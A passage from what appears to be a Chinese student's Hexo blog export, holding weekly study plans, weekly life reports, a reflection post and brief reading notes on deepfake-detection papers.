</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>要总结一下每日必做的内容</li>
<li>这个学期的指标是要看至少20部经典电影</li>
<li>如何养成看书的习惯</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>专业课</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li><p>英语背单词</p>
</li>
<li><p>英语听力</p>
</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>专业课</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>英语网课</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月</tag>
      </tags>
  </entry>
  <entry>
    <title>思考：2023年09月17日</title>
    <url>/2023/09/17/%E9%97%AE%E9%A2%98%E6%80%9D%E8%80%83/%E4%B8%AA%E4%BA%BA%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h1 id="个人思考"><a href="#个人思考" class="headerlink" title="个人思考"></a>个人思考</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
<li>如何在比较嘈杂的环境下学习?</li>
<li>如何保持自律的生活节奏</li>
<li>需要每天写日记吗</li>
<li>每日必做的任务有哪些？</li>
<li>如何养成看书的习惯</li>
<li>如何安排时间来培养自己的其他方面的提升</li>
<li>如何将购置物品添加到生活中</li>
<li>如何处理各个电子设备的功能</li>
<li>各个社交平台的定位、xhs、知乎等</li>
<li>如何把冥想坚持下去</li>
<li>运动的安排</li>
<li>调整在宿舍的生活习惯</li>
<li>怎样安排作息会比较好</li>
<li>任务权重如何划分</li>
<li>如何早起</li>
</ol>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol>
<li><p>每日必做的任务</p>
<ol>
<li>背单词</li>
<li>刷算法题</li>
<li>刷英语听力</li>
<li>理财</li>
<li>看今日资讯</li>
</ol>
</li>
<li><p>如何调整上课和日常学习时间</p>
<ol>
<li>上课时间更适合用于比较零碎的学习，如背单词、背一些零碎的东西</li>
<li>如果学习疲惫了，可以试着看一些高分电影，提升自己的素养</li>
</ol>
</li>
</ol>
<h2 id="尚未解决的问题"><a href="#尚未解决的问题" class="headerlink" title="尚未解决的问题"></a>尚未解决的问题</h2><h2 id="警示名言"><a href="#警示名言" class="headerlink" title="警示名言"></a>警示名言</h2><p>如果你想要成长地更快，就要待在一个人才密度很高的环境里。</p>
<p>这是优等生身上常见的“好学生心态”，为了满足家长、学校、社会对自己的期待，不断push自己前进，却忽视了自己内心的目标和追求。</p>
<p>生活从来都是泥沙俱下。一个人若想把生活过得越来越好，最重要的是像九头蛇般拥有反脆弱能力，不被挫折打垮，而且愈战愈强</p>
<p>放弃暂时的舒适区，对我来说不是难事，我更喜欢不断学习新事物，挑战未知，走在行业的最前沿，才能学到更多</p>
<h2 id="已经经过实践正式的结论"><a href="#已经经过实践正式的结论" class="headerlink" title="已经经过实践正式的结论"></a>已经经过实践正式的结论</h2><ol>
<li>发现算账的app真不好用<ol>
<li>要算账的话，还是只能依靠各自平台的账单功能</li>
</ol>
</li>
<li>兜兜转转还是在自习室学习效率高<ol>
<li>教室学习，一个人容易走神</li>
</ol>
</li>
<li>手机最好不要下载短视频</li>
<li>刻意练习四要素”：定义明确的目标、极度的专注、有效的反馈、在拉伸区练习。</li>
</ol>
<h2 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h2><p>天下熙熙，皆为利来；天下攘攘，皆为利往。–《史记》</p>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月，思考</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-9月第三周学习计划</title>
    <url>/2023/09/17/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-9/2023-9-3rd-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-9第三周学习计划"><a href="#2023-9第三周学习计划" class="headerlink" title="2023-9第三周学习计划"></a>2023-9第三周学习计划</h1><p>本文主要规划的是 <code>9-18</code> 到 <code>9-24</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>汇编语言</li>
<li>操作系统</li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>有时间重新写一个可以复用的遗传算法代码</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li><p>将汇编学习完成</p>
</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li><p>准备英语四级的备考</p>
<ol>
<li><p>制定一个大体的学习计划</p>
</li>
<li><p>开始进行有规律的刷题</p>
</li>
<li><p>开始看网课学习</p>
</li>
<li><p>制定一个学习目标</p>
</li>
<li><p>要等汇编学习结束以后</p>
</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><p>1.<br>3. </p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>要总结一下每日必做的内容</li>
<li></li>
<li></li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上课</li>
<li>复习单词</li>
<li>看书</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>算法题（1小时）</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>理论之类的学习</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li><p>看书静心学习</p>
</li>
<li><p>看书</p>
</li>
<li><p>规划</p>
</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><p>1. </p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-9月第二周学习计划</title>
    <url>/2023/09/10/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-9/2023-9-2nd-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-9第一周学习计划"><a href="#2023-9第一周学习计划" class="headerlink" title="2023-9第一周学习计划"></a>2023-9第一周学习计划</h1><p>本文主要规划的是 <code>9-11</code> 到 <code>9-17</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>要开始培养看书的习惯</li>
<li>制定这个学习大致的学习计划</li>
<li></li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li><p>要重新整理一下优化算法的代码，以便于下次比赛的时候再碰到类似的题目</p>
<ol>
<li>下次花20块钱来买一份论文，效率可能会更快一点</li>
</ol>
</li>
<li><p><del>重新求证一下认证杯特等奖奖金的事情</del></p>
</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li><p>学习并完成操作系统章节三的练习</p>
</li>
<li><p>争取完成os第四章节的练习</p>
</li>
<li><p>预习一下一生一芯计划</p>
</li>
<li><p><del>准备开始编译器的学习</del></p>
</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li><p>这周的任务是把单词全部都复习完成</p>
</li>
<li><p>重新规划一下任务</p>
<ol>
<li>单词重新</li>
</ol>
</li>
<li><p>四级报名</p>
</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>编写Python代码</li>
<li>准备01星球的大项目</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>最近要养成一个爱好</li>
<li>看一下要不要锻炼</li>
<li>寻找一下看书的时间段</li>
<li>四阶魔方的复原</li>
<li>思考一下如何将一些经验进行总结</li>
<li></li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上课</li>
<li>背单词</li>
<li>看书</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>算法题（1小时）</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>理论之类的学习</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li><p>看书静心学习</p>
</li>
<li><p>看书</p>
</li>
<li><p>规划</p>
</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><p>1. </p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>周报</title>
    <url>/2023/09/03/%E5%91%A8%E6%8A%A5/2023/2023%E5%B9%B49%E6%9C%88/%E5%91%A8%E6%8A%A5#2%20%E6%9D%A5%E5%AD%A6%E6%A0%A1%E4%B8%80%E5%91%A8%E5%90%8E/</url>
    <content><![CDATA[<h1 id="周报-2-已经来学校一周后的生活"><a href="#周报-2-已经来学校一周后的生活" class="headerlink" title="周报 #2 - 已经来学校一周后的生活"></a>周报 #2 - 已经来学校一周后的生活</h1><p>本篇是对 <code>2023-08-28</code> 到 <code>2023-09-3</code> 这几周生活的记录与思考。</p>
<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>最近是把驾照搞定了，还有家里面一些的事情也都解决了。最近也是在进行单词的复习，现在还是剩下1000多个吧，抓紧这一周的时间内解决掉吧，后面要开始雅思的准备了，就算是否报名到四级都要开始准备了，要先解决教材、网课、还有最重要的准备时间。同时也和魏毅老师进行深度思想上的沟通，认为我年轻需要多尝试，要找到自己真正喜欢的事情，以至于35岁危机可以不用那么担心，就算被裁员了，程序员也赚到了别人一辈子都赚不到的钱，后面可以自己合伙开公司，或者转做投资，反正就是要做自己喜欢的事情，这样才会有动力。后面要</p>
<h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>这周到厦门玩了几天，这应该算做我的第一次个人旅行，结束掉了我过去一周的颓废和低迷，让我不在继续精神内耗了。同时感觉一个人旅行是真的很爽，那种自由和洒脱，是人生中少有的感觉，我终于感觉到了那种想风一样的自由到底是一种什么样的状态。</p>
<p>回来以后，为了快速开始学习，去了家旁边的自习室学习，在这里的学习状态感觉有回到了学校学习的感觉，就是在里面不能大声用键盘。但是我也要逐渐开始适应自己在家学习和工作，毕竟这个才是自己在工作以后经常会遇到的情况，在公司工作，在家还要做自己学习。</p>
<h2 id="有趣的事与物"><a href="#有趣的事与物" class="headerlink" title="有趣的事与物"></a>有趣的事与物</h2><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><h3 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h3><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><h3 id="电影"><a href="#电影" class="headerlink" title="电影"></a>电影</h3><h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3>]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月，周报</tag>
      </tags>
  </entry>
  <entry>
    <title>周报</title>
    <url>/2023/09/03/%E5%91%A8%E6%8A%A5/2023/2023%E5%B9%B49%E6%9C%88/Untitled/</url>
    <content><![CDATA[<blockquote>
<p>“我非常喜欢的一个东西，是一个人十三四岁的夏天，在路上捡到一支真枪因为年少无知，天不怕地不怕，他扣下扳机。没有人死，也没有人受伤。他认为自己开了空枪后来他三十岁或者更老，走在路上听到背后有隐隐约约的风声他停下来转过身去，子弹正中眉心。”</p>
</blockquote>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月，周报</tag>
      </tags>
  </entry>
  <entry>
    <title>周报</title>
    <url>/2023/09/03/%E5%91%A8%E6%8A%A5/2023/2023%E5%B9%B49%E6%9C%88/%E5%91%A8%E6%8A%A5#3%20%E5%8F%82%E5%8A%A0%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%9A%84%E4%B8%80%E5%91%A8/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月，周报</tag>
      </tags>
  </entry>
  <entry>
    <title>周报</title>
    <url>/2023/09/03/%E5%91%A8%E6%8A%A5/2023/2023%E5%B9%B49%E6%9C%88/%E5%91%A8%E6%8A%A5#4%202023%E5%B9%B49%E6%9C%88%E7%AC%AC%E4%B8%89%E5%91%A8/</url>
    <content><![CDATA[<h1 id="周报-4-2023年9月第三周"><a href="#周报-4-2023年9月第三周" class="headerlink" title="周报 #4 - 2023年9月第三周"></a>周报 #4 - 2023年9月第三周</h1><p>本篇是对 <code>2023-09-18</code> 到 <code>2023-09-24</code>  这几周生活的记录与思考。</p>
<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>今天因为一下要去回家参加丧假，导致学习进度没有达到目标，这周目前是只是看完了汇编的书籍，课本后面剩下的实验都没有做，后面要找个时间补做一下。现在要思考一下后面的学习目标，首先是这个月份至少要完成掉操作系统的学习。</p>
<p>现在最重要的是还是没有开始进行英语四级的学习，还是只是粗浅的背背单词而已，下周开始要进行非常正式的训练了。思考一下安排学习英语的时间段，要安排哪种绝对不会有课的时间段，这么一看就是，中午和晚上的时间，中午用来刷题，晚上用来理论的学习。还是按照上学期的顺序来学习，先听力后阅读，因为这学期的给的时间充裕了一点，希望可以乘早学完，这学期的学习目标，就是能够保证四级能够通过就行</p>
<p>现在这么一看能够分配给计算机课程学习的时间也就只有，上午和下午了。上午还经常有课不好学习，或者就是要补觉，</p>
<p>对于计算机的课程最好是要一门一门的学习，不能够多个课程同步学习，这样反倒不利于学习。最好是一边看网课，一边刷题。</p>
<p>目前对时间的规划是这样的，上午和下午用来学习专业课（8小时），中午和晚上用于学习英语（4小时），</p>
<h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>周五，难得有一天上午起的很早，6点钟起床，赶上早上第一班地铁，先是到了张宇晨的学校（福州大学）游玩了一下，并且讨论了一下各自的生活，后面因为他要上课，后面有去了蔡肇基的学校（福州中医药大学），粗浅的感受了中医，并到文创店买了两包香囊，一个提神醒脑，一个安神助眠。下午去了郑鑫铭的学校（福州大学志诚学院），第一次见到比武夷学院还要破的学校。傍晚又去了江昊凌的学校（福建理工大学），感觉就是挺新的。</p>
<p>现在的问题就是如何处理学习和生活之间的关系，现在已经是大三，没多少时间用来学习，所以要抓紧时间。</p>
<h2 id="有趣的事与物"><a href="#有趣的事与物" class="headerlink" title="有趣的事与物"></a>有趣的事与物</h2><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><h3 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h3><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><h3 id="电影"><a href="#电影" class="headerlink" title="电影"></a>电影</h3><p>《绿皮书》、《侏罗纪公园》、《惊声尖笑》、</p>
<h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3>]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月，周报</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-9第一周学习计划</title>
    <url>/2023/09/03/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-9/2023-9-1st-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-9第一周学习计划"><a href="#2023-9第一周学习计划" class="headerlink" title="2023-9第一周学习计划"></a>2023-9第一周学习计划</h1><p>本文主要规划的是 <code>9-4</code> 到 <code>9-10</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>要开始培养看书的习惯</li>
<li>制定这个学习大致的学习计划</li>
<li></li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>准备数学建模比赛的准备<ol>
<li>要重新整理一下代码了</li>
</ol>
</li>
<li>参加国赛</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>学习并完成操作系统章节二的练习</li>
<li>准备后面计算机组成原理的书籍</li>
<li>预习一下一生一芯计划</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>这周的任务是把单词全部都复习完成</li>
<li>购买雅思备考的书籍</li>
<li>制定一下大体的学习计划</li>
<li>四级报名</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>这周暂时不要学习</li>
<li>重新复习一下Python</li>
<li></li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>最近要养成一个爱好</li>
<li>看一下要不要锻炼</li>
<li>寻找一下看书的时间段</li>
<li></li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上课（学习操作系统）</li>
<li>背单词</li>
<li></li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li><p>算法题（1小时）</p>
</li>
<li></li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>实操之类的学习</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li><p>看书静心学习</p>
</li>
<li><p>看书</p>
</li>
<li><p>规划</p>
</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>购物</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/08/09/%E7%A7%91%E7%A0%94/CV%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="文献阅读笔记"><a href="#文献阅读笔记" class="headerlink" title="文献阅读笔记"></a>文献阅读笔记</h1><h2 id="Self-supervised-Learning-of-Adversarial-Example-Towards-Good-Generalizations-for-Deepfake-Detection-CVPR-2022"><a href="#Self-supervised-Learning-of-Adversarial-Example-Towards-Good-Generalizations-for-Deepfake-Detection-CVPR-2022" class="headerlink" title="Self-supervised Learning of Adversarial Example- Towards Good Generalizations for Deepfake Detection, CVPR 2022"></a>Self-supervised Learning of Adversarial Example- Towards Good Generalizations for Deepfake Detection, CVPR 2022</h2><p><strong>自监督学习对抗的例子：Deepfake检测的良好推广</strong></p>
<blockquote>
<p>代码：<a href="https://github.com/liangchen527/SLADD">https://github.com/liangchen527/SLADD</a>.</p>
</blockquote>
<h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>这篇论文探讨了一种自我监督学习方法，用于生成对抗样本，以提高深度学习模型在检测Deepfake（深度伪造）方面的泛化能力。通过在训练过程中生成对抗样本，该方法可以使模型更好地学习到真实和虚假图像之间的差异，并提高其在未见过的数据上的性能。</p>
<h3 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h3><p>这篇论文的主要目的是提高深度学习模型在检测Deepfake（深度伪造）方面的泛化能力。传统的监督学习方法需要大量标注的数据，但是在Deepfake检测任务中，由于Deepfake技术的不断进步，标注数据很难跟上Deepfake技术的发展。因此，自监督学习方法成为一种可行的解决方案，可以利用未标注数据来提高模型的性能。同时，对抗样本也是一种常见的攻击手段，可以欺骗深度学习模型的预测结果。因此，本文提出了一种自监督学习方法，用于生成对抗样本，以提高深度学习模型在检测Deepfake方面的鲁棒性和泛化能力。</p>
<h3 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h3><p>这篇论文提出了一种自监督学习方法，用于生成对抗样本，以提高深度学习模型在检测Deepfake方面的鲁棒性和泛化能力。具体来说，该方法由两个阶段组成：</p>
<ol>
<li>自监督学习阶段：利用大量未标注的数据，训练一个自监督学习模型，用于生成对抗样本。该模型通过最大化输入图像和对抗样本之间的相似度来学习图像的表示，从而可以生成更具有欺骗性的对抗样本。</li>
<li>混合样本训练阶段：利用Mixup方法生成大量的混合样本，用于训练深度学习模型。Mixup方法通过线性插值的方式生成混合样本和混合标签，从而可以增强模型的鲁棒性和泛化能力。</li>
</ol>
<p>通过这两个阶段的训练，该方法可以提高深度学习模型在检测Deepfake方面的泛化能力和对抗攻击的鲁棒性。</p>
<p><img src="C:/Users/jiang/AppData/Roaming/Typora/typora-user-images/image-20230714215204315.png" alt="模型整体架构"></p>
<h2 id="Protecting-Celebrities-from-DeepFake-with-Identity-Consistency-Transformer-CVPR-2022"><a href="#Protecting-Celebrities-from-DeepFake-with-Identity-Consistency-Transformer-CVPR-2022" class="headerlink" title="Protecting Celebrities from DeepFake with Identity Consistency Transformer, CVPR 2022"></a>Protecting Celebrities from DeepFake with Identity Consistency Transformer, CVPR 2022</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><h3 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h3><h3 id="核心实验结果"><a href="#核心实验结果" class="headerlink" title="核心实验结果"></a>核心实验结果</h3><h3 id="主要创新点"><a href="#主要创新点" class="headerlink" title="主要创新点"></a>主要创新点</h3><h3 id="论文的不足"><a href="#论文的不足" class="headerlink" title="论文的不足"></a>论文的不足</h3><h2 id="论文题目"><a href="#论文题目" class="headerlink" title="论文题目"></a>论文题目</h2><h3 id="目的-1"><a href="#目的-1" class="headerlink" title="目的"></a>目的</h3><h3 id="方法概述-1"><a href="#方法概述-1" class="headerlink" title="方法概述"></a>方法概述</h3><h3 id="核心实验结果-1"><a href="#核心实验结果-1" class="headerlink" title="核心实验结果"></a>核心实验结果</h3><h3 id="主要创新点-1"><a href="#主要创新点-1" class="headerlink" title="主要创新点"></a>主要创新点</h3><h3 id="论文的不足-1"><a href="#论文的不足-1" class="headerlink" title="论文的不足"></a>论文的不足</h3>]]></content>
  </entry>
  <entry>
    <title>周报</title>
    <url>/2023/07/16/%E5%91%A8%E6%8A%A5/2023/2023%E5%B9%B47%E6%9C%88/%E5%91%A8%E6%8A%A5#1%20%E7%AC%AC%E4%B8%80%E7%AF%87%E5%91%A8%E6%8A%A5/</url>
    <content><![CDATA[<h1 id="周报-1-第一篇周报"><a href="#周报-1-第一篇周报" class="headerlink" title="周报 #1 - 第一篇周报"></a>周报 #1 - 第一篇周报</h1><p>本篇是对 <code>2023-07-10</code> 到 <code>2023-07-16</code> 这几周生活的记录与思考。</p>
<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>这周学习的内容很少，只学习了<code>pytorch</code>，感觉学习的内容有点少。</p>
<p>下周要开始添加英语的学习。</p>
<p>我对于学习开始慢慢有经验了，要注重学习的多样性，不能只学习一门课程，这样会有学习疲劳的。但是学习要有主次关系，要把主要的时间花在一个方向上。</p>
<p>感觉后面有时间我可以学习一点，多媒体运营，比如视频和公众号之类的</p>
<h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>这周到厦门玩了几天，这应该算做我的第一次个人旅行，结束掉了我过去一周的颓废和低迷，让我不在继续精神内耗了。同时感觉一个人旅行是真的很爽，那种自由和洒脱，是人生中少有的感觉，我终于感觉到了那种想风一样的自由到底是一种什么样的状态。</p>
<p>回来以后，为了快速开始学习，去了家旁边的自习室学习，在这里的学习状态感觉有回到了学校学习的感觉，就是在里面不能大声用键盘。但是我也要逐渐开始适应自己在家学习和工作，毕竟这个才是自己在工作以后经常会遇到的情况，在公司工作，在家还要做自己学习。</p>
<h2 id="有趣的事与物"><a href="#有趣的事与物" class="headerlink" title="有趣的事与物"></a>有趣的事与物</h2><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><h3 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h3><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><h3 id="电影"><a href="#电影" class="headerlink" title="电影"></a>电影</h3><h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3><p>新玩了一款叫 <strong>星噬</strong> 的游戏，玩法很简单，就是大鱼吃小鱼的玩法，但是又有所创新，</p>
]]></content>
      <categories>
        <category>周报</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>7月，周报</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-7第三周学习计划</title>
    <url>/2023/07/15/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-7/2023-7-3rd-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-7第三周学习计划"><a href="#2023-7第三周学习计划" class="headerlink" title="2023-7第三周学习计划"></a>2023-7第三周学习计划</h1><p>本文主要规划的是 <code>7-17</code> 到 <code>7-23</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>主要还是侧重与实习的工作</li>
<li>要开始培养看书的习惯</li>
<li></li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>把19篇论文看完<ol>
<li>要思考一下如何提高速度</li>
<li>要掌握一下看论文的方法</li>
<li></li>
</ol>
</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>开始操作系统的学习</li>
<li>要把刷算法题也要开始正常学习</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>要思考如何把英语纳入日常的学习生活中</li>
<li>就是要规划一下雅思的复习</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>java已经很久没开始学习</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>pr还差一点学完</li>
<li>要养成看书的习惯</li>
<li>考虑一下考驾照</li>
<li>开始慢慢戒掉短视频</li>
</ol>
